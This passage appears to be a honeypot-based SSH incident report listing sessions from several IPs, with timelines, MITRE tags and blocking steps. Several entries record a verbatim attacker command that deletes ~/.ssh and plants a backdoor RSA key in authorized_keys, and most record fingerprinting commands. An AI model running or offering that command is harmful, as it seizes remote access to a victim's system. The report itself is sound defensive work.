| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:33:41` | `cowrie.session.connect` |
| `2026-07-15 07:33:41` | `cowrie.client.version` |
| `2026-07-15 07:33:41` | `cowrie.client.kex` |
| `2026-07-15 07:33:44` | `cowrie.login.success` |
| `2026-07-15 07:33:46` | `cowrie.session.params` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.success` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.command.input` |
| `2026-07-15 07:33:46` | `cowrie.log.closed` |
| `2026-07-15 07:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66d0958ee14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:34 |
| **Last Seen** | 2026-07-15 07:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:34:48` | `cowrie.session.connect` |
| `2026-07-15 07:34:48` | `cowrie.client.version` |
| `2026-07-15 07:34:48` | `cowrie.client.kex` |
| `2026-07-15 07:34:50` | `cowrie.login.success` |
| `2026-07-15 07:34:52` | `cowrie.session.params` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.success` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.command.input` |
| `2026-07-15 07:34:52` | `cowrie.log.closed` |
| `2026-07-15 07:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5d00423ef2

| Field | Detail |
|---|---|
| **Source IP** | `95.217.105[.]210` |
| **First Seen** | 2026-07-15 07:43 |
| **Last Seen** | 2026-07-15 07:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:43:31` | `cowrie.session.connect` |
| `2026-07-15 07:43:31` | `cowrie.client.version` |
| `2026-07-15 07:43:31` | `cowrie.client.kex` |
| `2026-07-15 07:43:32` | `cowrie.login.success` |
| `2026-07-15 07:43:33` | `cowrie.session.params` |
| `2026-07-15 07:43:33` | `cowrie.command.input` |
| `2026-07-15 07:43:33` | `cowrie.command.failed` |
| `2026-07-15 07:43:33` | `cowrie.log.closed` |
| `2026-07-15 07:43:34` | `cowrie.session.params` |
| `2026-07-15 07:43:34` | `cowrie.command.input` |
| `2026-07-15 07:43:34` | `cowrie.session.file_download` |
| `2026-07-15 07:43:34` | `cowrie.log.closed` |
| `2026-07-15 07:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.217.105[.]210` to AbuseIPDB if not already reported
- [ ] Block `95.217.105[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9cefe25cc5

| Field | Detail |
|---|---|
| **Source IP** | `95.217.105[.]210` |
| **First Seen** | 2026-07-15 07:43 |
| **Last Seen** | 2026-07-15 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:43:34` | `cowrie.session.connect` |
| `2026-07-15 07:43:34` | `cowrie.client.version` |
| `2026-07-15 07:43:34` | `cowrie.client.kex` |
| `2026-07-15 07:43:34` | `cowrie.login.success` |
| `2026-07-15 07:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.217.105[.]210` to AbuseIPDB if not already reported
- [ ] Block `95.217.105[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1c2ff0d6eaa

| Field | Detail |
|---|---|
| **Source IP** | `95.217.105[.]210` |
| **First Seen** | 2026-07-15 07:43 |
| **Last Seen** | 2026-07-15 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:43:35` | `cowrie.session.connect` |
| `2026-07-15 07:43:35` | `cowrie.client.version` |
| `2026-07-15 07:43:35` | `cowrie.client.kex` |
| `2026-07-15 07:43:35` | `cowrie.login.success` |
| `2026-07-15 07:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.217.105[.]210` to AbuseIPDB if not already reported
- [ ] Block `95.217.105[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58f9fa06a59e

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-07-15 07:45 |
| **Last Seen** | 2026-07-15 07:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:45:59` | `cowrie.session.connect` |
| `2026-07-15 07:45:59` | `cowrie.client.version` |
| `2026-07-15 07:45:59` | `cowrie.client.kex` |
| `2026-07-15 07:45:59` | `cowrie.login.success` |
| `2026-07-15 07:46:00` | `cowrie.session.params` |
| `2026-07-15 07:46:00` | `cowrie.command.input` |
| `2026-07-15 07:46:00` | `cowrie.command.failed` |
| `2026-07-15 07:46:00` | `cowrie.log.closed` |
| `2026-07-15 07:46:01` | `cowrie.session.params` |
| `2026-07-15 07:46:01` | `cowrie.command.input` |
| `2026-07-15 07:46:01` | `cowrie.session.file_download` |
| `2026-07-15 07:46:01` | `cowrie.log.closed` |
| `2026-07-15 07:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36598a8f4a99

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-07-15 07:46 |
| **Last Seen** | 2026-07-15 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:46:01` | `cowrie.session.connect` |
| `2026-07-15 07:46:01` | `cowrie.client.version` |
| `2026-07-15 07:46:02` | `cowrie.client.kex` |
| `2026-07-15 07:46:02` | `cowrie.login.success` |
| `2026-07-15 07:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae491949133

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-07-15 07:46 |
| **Last Seen** | 2026-07-15 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:46:02` | `cowrie.session.connect` |
| `2026-07-15 07:46:02` | `cowrie.client.version` |
| `2026-07-15 07:46:03` | `cowrie.client.kex` |
| `2026-07-15 07:46:03` | `cowrie.login.success` |
| `2026-07-15 07:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-001f9b7b5498

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:16` | `cowrie.session.connect` |
| `2026-07-15 07:51:16` | `cowrie.client.version` |
| `2026-07-15 07:51:16` | `cowrie.client.kex` |
| `2026-07-15 07:51:16` | `cowrie.login.success` |
| `2026-07-15 07:51:17` | `cowrie.session.params` |
| `2026-07-15 07:51:17` | `cowrie.command.input` |
| `2026-07-15 07:51:18` | `cowrie.log.closed` |
| `2026-07-15 07:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c7b5cc8708

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:23` | `cowrie.session.connect` |
| `2026-07-15 07:51:23` | `cowrie.client.version` |
| `2026-07-15 07:51:23` | `cowrie.client.kex` |
| `2026-07-15 07:51:25` | `cowrie.login.success` |
| `2026-07-15 07:51:27` | `cowrie.session.params` |
| `2026-07-15 07:51:27` | `cowrie.command.input` |
| `2026-07-15 07:51:27` | `cowrie.log.closed` |
| `2026-07-15 07:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeaaea948163

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:30` | `cowrie.session.connect` |
| `2026-07-15 07:51:30` | `cowrie.client.version` |
| `2026-07-15 07:51:30` | `cowrie.client.kex` |
| `2026-07-15 07:51:32` | `cowrie.login.success` |
| `2026-07-15 07:51:35` | `cowrie.session.params` |
| `2026-07-15 07:51:35` | `cowrie.command.input` |
| `2026-07-15 07:51:35` | `cowrie.log.closed` |
| `2026-07-15 07:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-937a475c81b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:36` | `cowrie.session.connect` |
| `2026-07-15 07:51:37` | `cowrie.client.version` |
| `2026-07-15 07:51:37` | `cowrie.client.kex` |
| `2026-07-15 07:51:38` | `cowrie.login.success` |
| `2026-07-15 07:51:39` | `cowrie.session.params` |
| `2026-07-15 07:51:39` | `cowrie.command.input` |
| `2026-07-15 07:51:40` | `cowrie.log.closed` |
| `2026-07-15 07:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df1f2d158f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:43` | `cowrie.session.connect` |
| `2026-07-15 07:51:43` | `cowrie.client.version` |
| `2026-07-15 07:51:43` | `cowrie.client.kex` |
| `2026-07-15 07:51:43` | `cowrie.login.success` |
| `2026-07-15 07:51:44` | `cowrie.session.params` |
| `2026-07-15 07:51:44` | `cowrie.command.input` |
| `2026-07-15 07:51:44` | `cowrie.log.closed` |
| `2026-07-15 07:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca9a78d89f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:49` | `cowrie.session.connect` |
| `2026-07-15 07:51:49` | `cowrie.client.version` |
| `2026-07-15 07:51:49` | `cowrie.client.kex` |
| `2026-07-15 07:51:50` | `cowrie.login.success` |
| `2026-07-15 07:51:51` | `cowrie.session.params` |
| `2026-07-15 07:51:51` | `cowrie.command.input` |
| `2026-07-15 07:51:51` | `cowrie.log.closed` |
| `2026-07-15 07:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8936a222842e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:51 |
| **Last Seen** | 2026-07-15 07:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:51:56` | `cowrie.session.connect` |
| `2026-07-15 07:51:56` | `cowrie.client.version` |
| `2026-07-15 07:51:56` | `cowrie.client.kex` |
| `2026-07-15 07:51:57` | `cowrie.login.success` |
| `2026-07-15 07:51:58` | `cowrie.session.params` |
| `2026-07-15 07:51:58` | `cowrie.command.input` |
| `2026-07-15 07:51:58` | `cowrie.log.closed` |
| `2026-07-15 07:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c69bfe7ba38

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:03` | `cowrie.session.connect` |
| `2026-07-15 07:52:03` | `cowrie.client.version` |
| `2026-07-15 07:52:03` | `cowrie.client.kex` |
| `2026-07-15 07:52:05` | `cowrie.login.success` |
| `2026-07-15 07:52:07` | `cowrie.session.params` |
| `2026-07-15 07:52:07` | `cowrie.command.input` |
| `2026-07-15 07:52:07` | `cowrie.log.closed` |
| `2026-07-15 07:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b252833903dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:10` | `cowrie.session.connect` |
| `2026-07-15 07:52:10` | `cowrie.client.version` |
| `2026-07-15 07:52:10` | `cowrie.client.kex` |
| `2026-07-15 07:52:11` | `cowrie.login.success` |
| `2026-07-15 07:52:12` | `cowrie.session.params` |
| `2026-07-15 07:52:12` | `cowrie.command.input` |
| `2026-07-15 07:52:12` | `cowrie.log.closed` |
| `2026-07-15 07:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0554ee3f302e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:16` | `cowrie.session.connect` |
| `2026-07-15 07:52:16` | `cowrie.client.version` |
| `2026-07-15 07:52:17` | `cowrie.client.kex` |
| `2026-07-15 07:52:17` | `cowrie.login.success` |
| `2026-07-15 07:52:18` | `cowrie.session.params` |
| `2026-07-15 07:52:18` | `cowrie.command.input` |
| `2026-07-15 07:52:18` | `cowrie.log.closed` |
| `2026-07-15 07:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9400fa916a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:23` | `cowrie.session.connect` |
| `2026-07-15 07:52:23` | `cowrie.client.version` |
| `2026-07-15 07:52:23` | `cowrie.client.kex` |
| `2026-07-15 07:52:24` | `cowrie.login.success` |
| `2026-07-15 07:52:25` | `cowrie.session.params` |
| `2026-07-15 07:52:25` | `cowrie.command.input` |
| `2026-07-15 07:52:25` | `cowrie.log.closed` |
| `2026-07-15 07:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c4f7fa7612f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:29` | `cowrie.session.connect` |
| `2026-07-15 07:52:29` | `cowrie.client.version` |
| `2026-07-15 07:52:29` | `cowrie.client.kex` |
| `2026-07-15 07:52:30` | `cowrie.login.success` |
| `2026-07-15 07:52:31` | `cowrie.session.params` |
| `2026-07-15 07:52:31` | `cowrie.command.input` |
| `2026-07-15 07:52:32` | `cowrie.log.closed` |
| `2026-07-15 07:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd518a9a9aaa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:37` | `cowrie.session.connect` |
| `2026-07-15 07:52:37` | `cowrie.client.version` |
| `2026-07-15 07:52:37` | `cowrie.client.kex` |
| `2026-07-15 07:52:37` | `cowrie.login.success` |
| `2026-07-15 07:52:38` | `cowrie.session.params` |
| `2026-07-15 07:52:38` | `cowrie.command.input` |
| `2026-07-15 07:52:38` | `cowrie.log.closed` |
| `2026-07-15 07:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b1014779e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
| **Last Seen** | 2026-07-15 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:52:44` | `cowrie.session.connect` |
| `2026-07-15 07:52:44` | `cowrie.client.version` |
| `2026-07-15 07:52:44` | `cowrie.client.kex` |
| `2026-07-15 07:52:45` | `cowrie.login.success` |
| `2026-07-15 07:52:46` | `cowrie.session.params` |
| `2026-07-15 07:52:46` | `cowrie.command.input` |
| `2026-07-15 07:52:46` | `cowrie.log.closed` |
| `2026-07-15 07:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]55` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2656f47822cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]55` |
| **First Seen** | 2026-07-15 07:52 |
